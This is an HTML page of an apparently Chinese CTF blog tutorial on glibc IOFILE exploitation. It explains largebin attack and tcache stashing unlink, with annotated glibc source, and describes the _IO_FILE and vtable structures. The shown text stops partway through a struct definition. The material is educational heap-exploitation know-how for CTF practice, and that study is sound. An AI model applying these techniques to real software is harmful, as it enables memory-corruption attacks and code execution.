<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="IOFILE阶段性学习成果汇报大会">
<meta property="og:type" content="article">
<meta property="og:title" content="IOFILE exploit">
<meta property="og:url" content="http://example.com/2023/08/11/IOFILE-exploit/index.html">
<meta property="og:site_name" content="Whirling-In-Rags">
<meta property="og:description" content="IOFILE阶段性学习成果汇报大会">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811162248700.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811170105495.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811172846782.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811173045845.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811173332086.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811173606405.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811182023451.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811213323111.png">
<meta property="og:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811214840282.png">
<meta property="article:published_time" content="2023-08-11T08:02:03.000Z">
<meta property="article:modified_time" content="2023-12-09T13:51:46.126Z">
<meta property="article:author" content="DeePunk">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/IOFILE-exploit.assets/image-20230811162248700.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>IOFILE exploit</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/DeePunk42">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/12/SROP/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/07/27/house-of-cat/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/11/IOFILE-exploit/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/11/IOFILE-exploit/&text=IOFILE exploit"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/11/IOFILE-exploit/&is_video=false&description=IOFILE exploit"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IOFILE exploit&body=Check out this article: http://example.com/2023/08/11/IOFILE-exploit/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/11/IOFILE-exploit/&name=IOFILE exploit&description=IOFILE阶段性学习成果汇报大会"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/11/IOFILE-exploit/&t=IOFILE exploit"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E6%89%8B%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">辅助手法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#largebin-attack"><span class="toc-number">2.1.</span> <span class="toc-text">largebin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">2.2.</span> <span class="toc-text">tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-stashing-unlink-attack"><span class="toc-number">2.3.</span> <span class="toc-text">tcache stashing unlink attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IOFILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">IOFILE及相关结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-FILE-PLUS"><span class="toc-number">3.1.</span> <span class="toc-text">_IO_FILE_PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-FILE"><span class="toc-number">3.2.</span> <span class="toc-text">_IO_FILE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-jump-t"><span class="toc-number">3.3.</span> <span class="toc-text">_IO_jump_t</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FSOP%E5%9F%BA%E7%A1%80"><span class="toc-number">4.</span> <span class="toc-text">FSOP基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91IO%E6%B5%81"><span class="toc-number">4.1.</span> <span class="toc-text">触发IO流</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FSOP-IO-flush-all-lockp"><span class="toc-number">4.1.1.</span> <span class="toc-text">FSOP - _IO_flush_all_lockp()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-kiwi-malloc-assert"><span class="toc-number">4.1.2.</span> <span class="toc-text">house of kiwi - __malloc_assert</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fxprintf"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">__fxprintf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fflush"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">fflush</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0FILE%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">4.2.</span> <span class="toc-text">伪造FILE结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E5%8F%A4%E6%97%B6%E6%9C%9F%E7%9A%84FSOP-Glibc"><span class="toc-number">4.2.1.</span> <span class="toc-text">上古时期的FSOP(Glibc&lt;2.24)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E8%A1%A8%E5%81%8F%E7%A7%BB%E6%97%B6%E4%BB%A3-Glibc-2-24"><span class="toc-number">4.2.2.</span> <span class="toc-text">虚表偏移时代(Glibc&gt;&#x3D;2.24)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E6%97%B6%E4%BB%A3%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACIOFILE%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">新时代的高版本IOFILE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">5.1.</span> <span class="toc-text">house of kiwi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-emma"><span class="toc-number">5.2.</span> <span class="toc-text">house of emma</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-pig"><span class="toc-number">5.3.</span> <span class="toc-text">house of pig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-cat"><span class="toc-number">5.4.</span> <span class="toc-text">house of cat</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        IOFILE exploit
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">DeePunk</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-11T08:02:03.000Z" class="dt-published" itemprop="datePublished">2023-08-11</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CS/">CS</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>前段时间给人讲课，碰上了高版本glibc堆利用这部分。刚好自己啥也不会，于是花了些时间好好学了下IOFILE在高版本下的利用。好在最后没有翻车，自己在备课期间也独立完成了一些经典例题，算是有了一些粗浅的收获。现以一个初学者的目光重新梳理学习IOFILE利用的整个过程。</p>
<h1 id="辅助手法"><a href="#辅助手法" class="headerlink" title="辅助手法"></a>辅助手法</h1><p>IOFILE的利用，通常需要伪造IOFILE结构体，随后通过一些方式触发IO流，使得程序调用我们劫持后的IO函数，从而达成getshell或者orw。所以IOFILE exploit实际上是整个利用环节的<strong>最后一步</strong>，要达成伪造IOFILE结构体、触发IO链，往往需要借助一些<strong>辅助手法</strong>。</p>
<p>在高版本下，最为常用的是<strong>largebin attack</strong>，该手法需要一个UAF，达成后能在任意目标地址写上堆地址，简单暴力，用过都说好。还有<strong>tcache poisoning</strong>，用来分配到任意地址上。还有一种是<strong>tcache stashing unlink</strong>，该手法在house of pig中被使用，要求程序使用calloc，并存在UAF，通常结合largebin attack达成将目标地址分配为chunk。</p>
<h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote>
<p>原先存在两条利用链，其中一条在高版本下已被封禁，查找资料时需甄别。</p>
</blockquote>
<p>首先我们需要了解largebin的结构：</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811162248700.png" alt="image-20230811162248700"></p>
<p>一个large bin中包含<strong>一定范围大小</strong>的large chunk，如第一个largebin大小范围为(0x400-0x430)，第二个为(0x440-0x470)。同一个bin中，相同大小的chunk之间用<code>fd</code>、<code>bk</code>相连，不同大小用<code>fd_nextsize</code>、<code>bk_nextsize</code>相连，且自动由大到小排序，如上图中左边的大于右边。</p>
<p>当有新的chunk加入largebin，且大小小于该bin中已有的chunk时，会进行如下操作（精简版）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line"><span class="comment">/*查找该size属于的bin范围，返回index*/</span></span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line"><span class="comment">/*取得bin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//critical1!!!</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//critical2!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该操作实际上完成了一个简单的将chunk加入双向链表的过程，可以逐步手动模拟加深理解</p>
<p>该操作缺失对双向链表完整性的检查，可以加以利用</p>
<p>我们假设largebin中仅存在chunk0，现在准备将chunk1加入largebin，且chunk0 &gt; chunk1。我们把chunk0的<code>bk_nextsize</code>修改为<code>[target-0x20]</code>(即<code>target</code>目标地址位于以<code>[target-0x20]</code>开头的chunk的<code>fd_nextsize</code>处)</p>
<p>修改完成后，我们将chunk1入链，重点关注上述代码片段中注释的部分。critical1处 <code>victim-&gt;bk_nextsize = (&amp;target)-4)</code>，critical2处 <code>(&amp;target)-4)-&gt;fd_nextsize = victim</code>，即<code>*target = victim</code>。目标达成</p>
<p>由此可见，largebin attack的利用相当简单，只需一个UAF即可完</p>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>忘写了XD</p>
<h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>glibc加入tcache后，当从smallbin中取出chunk时，如果smallbin中仍有chunk且对应tcache未填满，则会将smallbin中剩余chunk全部依次放入对应tcache中。而在该过程中，只对从smallbin中取出的chunk进行了完整性检查，后续chunk均没有。该手法则利用了这一漏洞。</p>
<p>以下为将smallbin中chunk放入tcache的代码片段：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">//只对第一个chunk进行了完整性检查，后面进入循环，无检查</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">//将其放入到Tcache中</span></span><br><span class="line">tcache_put (tc_victim, tc_idx);</span><br></pre></td></tr></table></figure>

<p>假设smallbin中只存在两个chunk，先入的为chunk0，后入的为chunk1，根据smallbin的<strong>FIFO</strong>原则，取出时先取出chunk0</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811170105495.png" alt="image-20230811170105495"></p>
<p>同时令对应大小的tcache中已填入5个chunk</p>
<p>此时将chunk1的<code>bk</code>位修改为目标地址<code>target</code>（不破坏<code>fd</code>），并利用其他手法使得<code>[target+0x8]</code>处为一个指向<strong>可写内存</strong>的指针。把<code>target</code>看作一个chunk的用户指针，则<code>[target+0x8]</code>为<code>bk</code>位。此处令其可写是因为进行该攻击时会向该指针指向的地址处写一个值，如果不可写的话程序会报错。用largebin attack将此处覆盖为可写的堆地址是一种常见操作</p>
<p>此时，我们用<code>calloc</code>函数将chunk0申请出来。<code>calloc</code>具有跳过tcache申请chunk的性质，所以此处只能用<code>calloc</code>。之后chunk1会加入tcache，chunk1的bk指向的<code>target</code>也会加入tcache。如果我们使用<code>malloc</code>，根据tcache <strong>LIFO</strong>的性质，就能将<code>target</code>申请出来。</p>
<h1 id="IOFILE及相关结构"><a href="#IOFILE及相关结构" class="headerlink" title="IOFILE及相关结构"></a>IOFILE及相关结构</h1><h2 id="IO-FILE-PLUS"><a href="#IO-FILE-PLUS" class="headerlink" title="_IO_FILE_PLUS"></a>_IO_FILE_PLUS</h2><p>程序在进行<strong>IO操作</strong>时，会用到IOFILE相关的结构。例如众所周知的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，都是指向IO结构体的指针。当打开一个文件时，程序需要记录文件的输入输出缓冲区等内容，于是需要一个<code>_IO_FILE</code>结构体进行记录。除此之外，对文件进行的各种操作形成了一张张函数虚表，文件需要一个指针记录对应的函数虚表，该指针被定义为<code>_IO_jump_t</code>类型。<code>_IO_FILE</code> 结构体和虚表指针<code>_IO_jump_t</code>形成了一个称为<code>_IO_FILE_plus</code>的结构体，它的定义是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>常见的<code>_IO_FILE_plus</code>结构体有<code>_IO_2_1_stderr</code>、<code>_IO_2_1_stdout</code>、<code>_IO_2_1_stdin</code>，前面提到的<code>stdin</code>等就是指向这些对应<code>_IO_FILE_plus</code>结构体的指针</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811172846782.png" alt="image-20230811172846782"></p>
<p>可以通过gdb的<code>p</code>指令查看</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811173045845.png" alt="image-20230811173045845"></p>
<p>此外，存在一个指向<code>_IO_FILE_plus</code>结构体的<code>_IO_list_all</code>指针，通常情况下指向<code>_IO_2_1_stderr</code></p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811173332086.png" alt="image-20230811173332086"></p>
<p>每个<code>_IO_FILE</code>结构体中都存在一个<code>_chain</code>指针，指向下一个<code>_IO_FILE_plus</code>结构体。通常情况，表示如下：</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811173606405.png" alt="image-20230811173606405"></p>
<p>当有新文件被打开时，对应的<code>_IO_FILE_plus</code>结构体就会被插入到<strong>链首</strong>。</p>
<h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>以下是<code>_IO_FILE</code>结构体的源码，看起来可能有些头大，重点需要了解的是几个<strong>缓冲区的指针</strong>、<code>_chain</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>_IO_FILE_complete</code>可以理解为<code>_IO_FILE</code>的豪华加长版，其中的<code>_wide_data</code>需要关注一下，有些手法会用到。</p>
<h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p><code>vtable</code>是一个指向<code>_IO_jump_t</code>结构体的指针。当打开一个文件时，相应的 <code>_IO_FILE</code> 结构体会被创建，并将其<code> vtable</code> 字段指向对应文件类型的 <code>_IO_jump_t</code> 结构体的地址。这样，当需要执行文件操作时，可以通过 <code>_IO_FILE</code> 结构体中的 <code>vtable</code> 字段获取到相应的 <code>_IO_jump_t</code> 结构体，并通过其中的函数指针调用相应的文件操作函数。</p>
<p>通常，一个<code>_IO_jump_t</code> 结构体包含以下函数指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span 